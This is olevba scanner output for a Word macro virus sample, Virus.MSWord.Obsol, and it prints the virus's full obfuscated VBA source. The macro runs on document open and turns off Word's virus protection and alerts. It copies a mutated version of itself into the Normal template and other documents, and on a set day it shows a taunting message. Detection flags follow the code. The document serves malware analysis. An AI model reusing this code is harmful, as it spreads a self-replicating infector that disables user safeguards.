olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Obsol-4d7d7c06b6d45951b756e147b6e022b4baa6e8e3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Obsol-4d7d7c06b6d45951b756e147b6e022b4baa6e8e3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next: Dim °(30) As String: GoTo ¤23
¤20: §.InsertLines §.CountOfLines + Ю, Ґ.Lines(Ґ.CountOfLines, Ю): GoTo ¤21
¤16: If Len(Ґ.Lines(Ю, Ґ.CountOfLines)) <> Len(§.Lines(Ю, §.CountOfLines)) Then GoTo ¤03 Else GoTo ¤24
¤09: If с < Є Then GoTo ¤06 Else GoTo ¤10
¤04: р = р + Ю: GoTo ¤05
¤07: с = с + Ю: GoTo ¤08
¤23: ш = Asc(Chr(65)) - Asc(Chr(65)): Ю = Asc(Chr(66)) - Asc(Chr(65)): Ѕ = Asc(Chr(67)) - Asc(Chr(65)): ѕ = Asc(Chr(68)) - Asc(Chr(65)): « = Asc(Chr(96)) - Asc(Chr(65)): GoTo ¤22
¤22: With Application: .Options.VirusProtection = ш: .Options.SaveNormalPrompt = ш: .DisplayStatusBar = ш: .EnableCancelKey = ш: .DisplayAlerts = ш: End With: GoTo ¤13
¤12: For е = Ю To ©: ў = ў & °(е) & vbCr: Next: GoTo ¤17
¤15: Set Ґ = ThisDocument.VBProject.VBComponents(Ю).CodeModule: GoTo ¤16
¤06: If °(х + Ю) = "" Then GoTo ¤07 Else GoTo ¤08
¤05: с = ш: х = ш: Є = Int(Rnd * (© - р) + Ю): GoTo ¤06
¤25: MsgBox Application.UserName & " has become obsolete.", ш, "Class.Obsolete": GoTo ¤26
¤08: х = х + Ю: GoTo ¤09
¤24: If Day(Now()) = « Then GoTo ¤25 Else GoTo ¤26
¤17: §.DeleteLines Ю, §.CountOfLines: GoTo ¤18
¤13: If MacroContainer = ActiveDocument Then Set ± = NormalTemplate Else Set ± = ActiveDocument: GoTo ¤14
¤26: Exit Sub
¤10: °(х) = Ґ.Lines((© + ѕ) - р, Ю): GoTo ¤11
¤21: If ± = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName: GoTo ¤24
¤19: §.DeleteLines §.CountOfLines, Ю: GoTo ¤20
¤18: §.InsertLines Ю, Ґ.Lines(Ю, Ѕ) & vbCr & ў: GoTo ¤19
¤14: Set § = ±.VBProject.VBComponents(Ю).CodeModule: GoTo ¤15
¤11: If р = © Then GoTo ¤12 Else GoTo ¤04
¤03: © = Ґ.CountOfLines - ѕ: GoTo ¤04
End Sub 'Class.Obsolete written by jackie
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

